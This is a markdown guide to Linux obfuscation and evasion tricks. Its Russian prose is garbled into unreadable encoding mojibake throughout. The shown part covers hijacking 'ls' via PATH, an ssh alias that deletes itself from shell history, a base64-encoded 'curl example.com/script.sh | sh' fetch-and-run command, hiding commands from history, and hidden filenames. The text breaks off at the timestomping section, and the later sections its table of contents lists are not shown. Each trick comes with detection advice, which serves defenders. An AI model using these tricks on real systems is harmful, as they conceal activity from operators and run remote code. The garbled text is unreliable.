# Linux Obfuscation Tricks and Techniques

–≠—Ç–æ—Ç –¥–æ–∫—É–º–µ–Ω—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–±–æ—Ä–Ω–∏–∫ —Ç–µ—Ö–Ω–∏–∫ –∏ —Ç—Ä—é–∫–æ–≤ –≤ Linux. –ö–ª–∞—Å—Å–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–æ—Å—Ç—Ä–æ–µ–Ω–∞ –ø–æ —É—Ä–æ–≤–Ω—è–º –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞—Ç—Ä–∞–≥–∏–≤–∞—é—Ç—Å—è –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ç—Ä—é–∫–∞.

<a name="toc"></a>
## –û–≥–ª–∞–≤–ª–µ–Ω–∏–µ

*   [–£—Ä–æ–≤–µ–Ω—å 1: –û–±–æ–ª–æ—á–∫–∞ –∏ –æ–∫—Ä—É–∂–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è](#—É—Ä–æ–≤–µ–Ω—å-1-–æ–±–æ–ª–æ—á–∫–∞-–∏-–æ–∫—Ä—É–∂–µ–Ω–∏–µ-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
    *   [1.1. –ü–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ $PATH](#11-–ø–æ–¥–º–µ–Ω–∞-–∫–æ–º–∞–Ω–¥-—á–µ—Ä–µ–∑-path)
    *   [1.2. –ü–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ `alias`](#12-–ø–æ–¥–º–µ–Ω–∞-–∫–æ–º–∞–Ω–¥-—á–µ—Ä–µ–∑-alias)
    *   [1.3. –ó–∞–ø—É—Ç—ã–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥ (Base64)](#13-–∑–∞–ø—É—Ç—ã–≤–∞–Ω–∏–µ-–∫–æ–º–∞–Ω–¥-base64)
    *   [1.4. –°–æ–∫—Ä—ã—Ç–∏–µ –∫–æ–º–∞–Ω–¥ –∏–∑ –∏—Å—Ç–æ—Ä–∏–∏](#14-—Å–æ–∫—Ä—ã—Ç–∏–µ-–∫–æ–º–∞–Ω–¥-–∏–∑-–∏—Å—Ç–æ—Ä–∏–∏)
    *   [1.5. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ (`$PS1`)](#15-–∏–∑–º–µ–Ω–µ–Ω–∏–µ-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è-–∫–æ–º–∞–Ω–¥–Ω–æ–π-—Å—Ç—Ä–æ–∫–∏-ps1)
*   [–£—Ä–æ–≤–µ–Ω—å 2: –§–∞–π–ª—ã –∏ –¥–∞–Ω–Ω—ã–µ](#—É—Ä–æ–≤–µ–Ω—å-2-—Ñ–∞–π–ª—ã-–∏-–¥–∞–Ω–Ω—ã–µ)
    *   [2.1. –°–æ–∑–¥–∞–Ω–∏–µ "–Ω–µ–≤–∏–¥–∏–º—ã—Ö" —Ñ–∞–π–ª–æ–≤](#21-—Å–æ–∑–¥–∞–Ω–∏–µ-–Ω–µ–≤–∏–¥–∏–º—ã—Ö-—Ñ–∞–π–ª–æ–≤)
    *   [2.2. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –º–µ—Ç–æ–∫ (Timestomping)](#22-–∏–∑–º–µ–Ω–µ–Ω–∏–µ-–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö-–º–µ—Ç–æ–∫-timestomping)
    *   [2.3. –°–æ–∑–¥–∞–Ω–∏–µ –∂–µ—Å—Ç–∫–æ–π —Å—Å—ã–ª–∫–∏ –Ω–∞ —Å–∫—Ä—ã—Ç—É—é –∫–æ–ø–∏—é](#23-—Å–æ–∑–¥–∞–Ω–∏–µ-–∂–µ—Å—Ç–∫–æ–π-—Å—Å—ã–ª–∫–∏-–Ω–∞-—Å–∫—Ä—ã—Ç—É—é-–∫–æ–ø–∏—é)
    *   [2.4. –ó–∞—â–∏—Ç–∞ —Ñ–∞–π–ª–æ–≤ —á–µ—Ä–µ–∑ –∞—Ç—Ä–∏–±—É—Ç –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ—Å—Ç–∏ (`immutable`)](#24-–∑–∞—â–∏—Ç–∞-—Ñ–∞–π–ª–æ–≤-—á–µ—Ä–µ–∑-–∞—Ç—Ä–∏–±—É—Ç-–Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ—Å—Ç–∏-immutable)
*   [–£—Ä–æ–≤–µ–Ω—å 3: –ü—Ä–∞–≤–∞ –∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏](#—É—Ä–æ–≤–µ–Ω—å-3-–ø—Ä–∞–≤–∞-–∏-–ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏)
    *   [3.1. –ë—ç–∫–¥–æ—Ä —á–µ—Ä–µ–∑ SUID/SGID –±–∏—Ç](#31-–±—ç–∫–¥–æ—Ä-—á–µ—Ä–µ–∑-suidsgid-–±–∏—Ç)
    *   [3.2. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –æ—Ç `root`](#32-–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞-–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏-–æ—Ç-root)
    *   [3.3. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ ACL (Access Control Lists)](#33-–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ-acl-access-control-lists)
    *   [3.4. –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–∏–µ–º —Ñ–∞–π–ª–æ–≤ —Å –ø–æ–º–æ—â—å—é "Sticky Bit"](#34-—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ-—É–¥–∞–ª–µ–Ω–∏–µ–º-—Ñ–∞–π–ª–æ–≤-—Å-–ø–æ–º–æ—â—å—é-sticky-bit)
    *   [3.5. Help Yourself](#35-help-yourself)
*   [–£—Ä–æ–≤–µ–Ω—å 4: –ü—Ä–æ—Ü–µ—Å—Å—ã –∏ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ](#—É—Ä–æ–≤–µ–Ω—å-4-–ø—Ä–æ—Ü–µ—Å—Å—ã-–∏-–∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ)
    *   [4.1. "–£–¥–∞–ª–µ–Ω–∏–µ" —Ä–∞–±–æ—Ç–∞—é—â–µ–≥–æ —Ñ–∞–π–ª–∞](#41-—É–¥–∞–ª–µ–Ω–∏–µ-—Ä–∞–±–æ—Ç–∞—é—â–µ–≥–æ-—Ñ–∞–π–ª–∞)
    *   [4.2. –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ (Process Masquerading)](#42-–º–∞—Å–∫–∏—Ä–æ–≤–∫–∞-–ø—Ä–æ—Ü–µ—Å—Å–∞-process-masquerading)
    *   [4.3. –û—Ç—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –æ—Ç —Ç–µ—Ä–º–∏–Ω–∞–ª–∞ (Daemonization)](#43-–æ—Ç—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ-–æ—Ç-—Ç–µ—Ä–º–∏–Ω–∞–ª–∞-daemonization)
    *   [4.4. –§–æ—Ä–∫-–±–æ–º–±–∞ (Fork Bomb)](#44-—Ñ–æ—Ä–∫-–±–æ–º–±–∞-fork-bomb)
*   [–£—Ä–æ–≤–µ–Ω—å 5: –°–∏—Å—Ç–µ–º–∞ –∏ —è–¥—Ä–æ](#—É—Ä–æ–≤–µ–Ω—å-5-—Å–∏—Å—Ç–µ–º–∞-–∏-—è–¥—Ä–æ)
    *   [5.1. –ü–µ—Ä–µ—Ö–≤–∞—Ç –≤—ã–∑–æ–≤–æ–≤ —á–µ—Ä–µ–∑ `LD_PRELOAD`](#51-–ø–µ—Ä–µ—Ö–≤–∞—Ç-–≤—ã–∑–æ–≤–æ–≤-—á–µ—Ä–µ–∑-ld_preload)
    *   [5.2. –ò–Ω—ä–µ–∫—Ü–∏—è –∫–æ–¥–∞ —á–µ—Ä–µ–∑ `ptrace`](#52-–∏–Ω—ä–µ–∫—Ü–∏—è-–∫–æ–¥–∞-—á–µ—Ä–µ–∑-ptrace)
    *   [5.3. –°–æ–∫—Ä—ã—Ç–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π —á–µ—Ä–µ–∑ `mount --bind`](#53-—Å–æ–∫—Ä—ã—Ç–∏–µ-–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π-—á–µ—Ä–µ–∑-mount---bind)
    *   [5.4. –•—Ä–∞–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –≤ RAM (`tmpfs`)](#54-—Ö—Ä–∞–Ω–µ–Ω–∏–µ-—Ñ–∞–π–ª–æ–≤-–≤-ram-tmpfs)
    *   [5.5. "–ñ–∏–≤—ã–µ" –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã —Å –ø–æ–º–æ—â—å—é `OverlayFS`](#55-–∂–∏–≤—ã–µ-–∏–∑–º–µ–Ω–µ–Ω–∏—è-—Å–∏—Å—Ç–µ–º—ã-—Å-–ø–æ–º–æ—â—å—é-overlayfs)
    *   [5.6. –õ–æ–≤—É—à–∫–∞ —Å `chattr`: –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–∞—è —Ç–æ—á–∫–∞ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è](#56-–ª–æ–≤—É—à–∫–∞-—Å-chattr-–Ω–µ–∏–∑–º–µ–Ω—è–µ–º–∞—è-—Ç–æ—á–∫–∞-–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è)
    *   [5.7. –õ–æ–≤—É—à–∫–∞ systemd: –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (LimitNPROC)](#57-–ª–æ–≤—É—à–∫–∞-systemd-–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ-–ø—Ä–æ—Ü–µ—Å—Å–æ–≤-limitnproc)
    *   [5.8. –õ–æ–≤—É—à–∫–∞ systemd: –ê–∫—Ç–∏–≤–∞—Ü–∏—è –ø–æ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–µ–º—É –ø—É—Ç–∏ (.path)](#58-–ª–æ–≤—É—à–∫–∞-systemd-–∞–∫—Ç–∏–≤–∞—Ü–∏—è-–ø–æ-–Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–µ–º—É-–ø—É—Ç–∏-path)
    *   [5.9. –õ–æ–≤—É—à–∫–∞ systemd: –î–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω–æ–µ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ (Drop-in)](#59-–ª–æ–≤—É—à–∫–∞-systemd-–¥–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω–æ–µ-–ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ-drop-in)
    *   [5.10. –õ–æ–≤—É—à–∫–∞ systemd: –°–±—Ä–æ—Å –ø—Ä–∞–≤ —á–µ—Ä–µ–∑ tmpfiles.d](#510-–ª–æ–≤—É—à–∫–∞-systemd-—Å–±—Ä–æ—Å-–ø—Ä–∞–≤-—á–µ—Ä–µ–∑-tmpfilesd)
    *   [5.11. –õ–æ–≤—É—à–∫–∞ systemd: –ö–∞—Å–∫–∞–¥–Ω—ã–π —Å–±–æ–π —á–µ—Ä–µ–∑ BindsTo](#511-–ª–æ–≤—É—à–∫–∞-systemd-–∫–∞—Å–∫–∞–¥–Ω—ã–π-—Å–±–æ–π-—á–µ—Ä–µ–∑-bindsto)

---

## –£—Ä–æ–≤–µ–Ω—å 1: –û–±–æ–ª–æ—á–∫–∞ –∏ –æ–∫—Ä—É–∂–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

–¢—Ä—é–∫–∏, –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ –Ω–∞ –æ–±–º–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —Å–æ–∫—Ä—ã—Ç–∏–µ –∫–æ–º–∞–Ω–¥ –≤ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–π —Å–µ—Å—Å–∏–∏ –∏–ª–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —É—Ç–∏–ª–∏—Ç –Ω–∞ —É—Ä–æ–≤–Ω–µ –∫–æ–º–∞–Ω–¥–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 1.1. –ü–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ $PATH

*   **üéØ –¶–µ–ª—å:** –ü–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å –≤—ã–∑–æ–≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, `ls`), –∑–∞—Å—Ç–∞–≤–∏–≤ —Å–∏—Å—Ç–µ–º—É –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –û–±–æ–ª–æ—á–∫–∞ –∏—â–µ—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è—Ö –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `$PATH` –ø–æ –ø–æ—Ä—è–¥–∫—É. –ü–æ–º–µ—Å—Ç–∏–≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é —Å –ø–æ–¥–¥–µ–ª—å–Ω—ã–º —Ñ–∞–π–ª–æ–º –≤ –Ω–∞—á–∞–ª–æ `$PATH`, –º—ã –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –≤—ã–∑–æ–≤.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    mkdir /tmp/fake_bin
    echo 'echo "–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–π –≤—ã–∑–æ–≤ ls!"; /bin/ls "$@"' > /tmp/fake_bin/ls
    chmod +x /tmp/fake_bin/ls
    export PATH=/tmp/fake_bin:$PATH
    ls
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ü—Ä–æ–≤–µ—Ä—è—Ç—å `echo $PATH` –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `which <–∫–æ–º–∞–Ω–¥–∞>`. –í —Å–∫—Ä–∏–ø—Ç–∞—Ö –≤—ã–∑—ã–≤–∞—Ç—å —É—Ç–∏–ª–∏—Ç—ã –ø–æ –ø–æ–ª–Ω–æ–º—É –ø—É—Ç–∏ (`/bin/ls`). 

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 1.2. –ü–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ `alias`

*   **üéØ –¶–µ–ª—å:** –ò–∑–º–µ–Ω–∏—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã –Ω–∞ —É—Ä–æ–≤–Ω–µ —Ç–µ–∫—É—â–µ–π —Å–µ—Å—Å–∏–∏.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –í `.bashrc` –∏–ª–∏ –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ–º —Ñ–∞–π–ª–µ —Å–æ–∑–¥–∞–µ—Ç—Å—è –ø—Å–µ–≤–¥–æ–Ω–∏–º (`alias`), –∫–æ—Ç–æ—Ä—ã–π –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—É—é –∫–æ–º–∞–Ω–¥—É.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –ê–ª–∏–∞—Å, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç ssh –∏ —Å—Ä–∞–∑—É —É–¥–∞–ª—è–µ—Ç –∫–æ–º–∞–Ω–¥—É –∏–∑ –∏—Å—Ç–æ—Ä–∏–∏
    alias ssh='function _ssh() { /usr/bin/ssh "$@"; history -d $(history 1); }; _ssh'
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É `alias` –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –≤—Å–µ—Ö –ø—Å–µ–≤–¥–æ–Ω–∏–º–æ–≤. –î–ª—è –æ–¥–Ω–æ–∫—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `\` –ø–µ—Ä–µ–¥ –∫–æ–º–∞–Ω–¥–æ–π (`\ls`). 

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 1.3. –ó–∞–ø—É—Ç—ã–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥ (Base64)

*   **üéØ –¶–µ–ª—å:** –°–∫—Ä—ã—Ç—å –∏—Å—Ç–∏–Ω–Ω–æ–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –≤ –∏—Å—Ç–æ—Ä–∏–∏ –∏–ª–∏ –ª–æ–≥–∞—Ö.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ö–æ–º–∞–Ω–¥–∞ –∫–æ–¥–∏—Ä—É–µ—Ç—Å—è –≤ `Base64`, –∞ –∑–∞—Ç–µ–º –¥–µ–∫–æ–¥–∏—Ä—É–µ—Ç—Å—è –∏ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ pipe –≤ `sh` –∏–ª–∏ `bash`.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –ö–æ–º–∞–Ω–¥–∞ 'curl example.com/script.sh | sh' –≤ Base64
    echo "Y3VybCBleGFtcGxlLmNvbS9zY3JpcHQuc2ggfCBzaAo=" | base64 -d | sh
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–∫–∞—Ç—å –≤ –ª–æ–≥–∞—Ö –≤—ã–∑–æ–≤—ã `base64 -d | sh`. –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å –ø—Ä–∞–≤–∞ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–æ–≤.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 1.4. –°–æ–∫—Ä—ã—Ç–∏–µ –∫–æ–º–∞–Ω–¥ –∏–∑ –∏—Å—Ç–æ—Ä–∏–∏

*   **üéØ –¶–µ–ª—å:** –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É —Ç–∞–∫, —á—Ç–æ–±—ã –æ–Ω–∞ –Ω–µ —Å–æ—Ö—Ä–∞–Ω–∏–ª–∞—Å—å –≤ —Ñ–∞–π–ª–µ `.bash_history`.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ü–æ—Å—Ç–∞–≤–∏—Ç—å –ø—Ä–æ–±–µ–ª –ø–µ—Ä–µ–¥ –∫–æ–º–∞–Ω–¥–æ–π (–µ—Å–ª–∏ `HISTCONTROL` —Å–æ–¥–µ—Ä–∂–∏—Ç `ignorespace`) –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `` (–≤–æ–∑–≤—Ä–∞—Ç –∫–∞—Ä–µ—Ç–∫–∏) –¥–ª—è "–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏" –∫–æ–º–∞–Ω–¥—ã –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª–µ.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –°–ø–æ—Å–æ–± 1: –ü—Ä–æ–±–µ–ª –≤ –Ω–∞—á–∞–ª–µ
     ./secret_command
    # –°–ø–æ—Å–æ–± 2: –í–æ–∑–≤—Ä–∞—Ç –∫–∞—Ä–µ—Ç–∫–∏ (–≤ –∏—Å—Ç–æ—Ä–∏–∏ –æ—Å—Ç–∞–Ω–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ 'ls -l')
    echo "malicious" > file; \r ls -l
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ù–∞—Å—Ç—Ä–æ–∏—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ (auditd) –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫—É –∫–æ–º–∞–Ω–¥ –Ω–∞ —É–¥–∞–ª–µ–Ω–Ω—ã–π syslog-—Å–µ—Ä–≤–µ—Ä.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 1.5. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ (`$PS1`)

*   **üéØ –¶–µ–ª—å:** –°–¥–µ–ª–∞—Ç—å —Ç–µ—Ä–º–∏–Ω–∞–ª –Ω–µ—É–¥–æ–±–Ω—ã–º –∏–ª–∏ —Å–∫—Ä—ã—Ç—å –≤–∞–∂–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é (—Ç–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è).
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è `$PS1` –∏–∑–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ –Ω–µ–∏–Ω—Ñ–æ—Ä–º–∞—Ç–∏–≤–Ω–æ–µ –∏–ª–∏ –ø—É—Å—Ç–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    export PS1="# " # –°–¥–µ–ª–∞—Ç—å –ø—Ä–æ–º–ø—Ç –º–∏–Ω–∏–º–∞–ª–∏—Å—Ç–∏—á–Ω—ã–º
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –í—ã–ø–æ–ª–Ω–∏—Ç—å `echo "$PS1"`. –ó–∞–¥–∞—Ç—å `readonly PS1` –≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –ø—Ä–æ—Ñ–∏–ª—è—Ö.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

## –£—Ä–æ–≤–µ–Ω—å 2: –§–∞–π–ª—ã –∏ –¥–∞–Ω–Ω—ã–µ

–ú–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ —Å —Ñ–∞–π–ª–∞–º–∏, –∏—Ö –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ –∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–º–∏ –Ω–∞ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 2.1. –°–æ–∑–¥–∞–Ω–∏–µ "–Ω–µ–≤–∏–¥–∏–º—ã—Ö" —Ñ–∞–π–ª–æ–≤

*   **üéØ –¶–µ–ª—å:** –°–¥–µ–ª–∞—Ç—å —Ñ–∞–π–ª —Ç—Ä—É–¥–Ω–æ–æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º—ã–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º–∏ —É—Ç–∏–ª–∏—Ç–∞–º–∏.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤: —Ç–æ—á–∫–∏ –≤ –Ω–∞—á–∞–ª–µ (`.`), –ø—Ä–æ–±–µ–ª–æ–≤, –Ω–µ–ø–µ—á–∞—Ç–∞–µ–º—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    touch .hidden_file
    touch "  leading_spaces"
    touch $'.hidden\rfile'
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `ls -la`. –ó–∞–∫–ª—é—á–∞—Ç—å –∏–º–µ–Ω–∞ —Ñ–∞–π–ª–æ–≤ –≤ –∫–∞–≤—ã—á–∫–∏ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –Ω–∏–º–∏.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 2.2. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –º–µ—Ç–æ–∫ (Timestomping)

*   **üéØ –¶–µ–ª—å:** –°–∫—Ä—ã—Ç—å —Ñ–∞–∫—Ç –Ω–µ–¥–∞–≤–Ω–µ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞, "–æ—Ç–∫–∞—Ç–∏–≤" –µ–≥–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏ –≤ –ø—Ä–æ—à–ª–æ–µ.
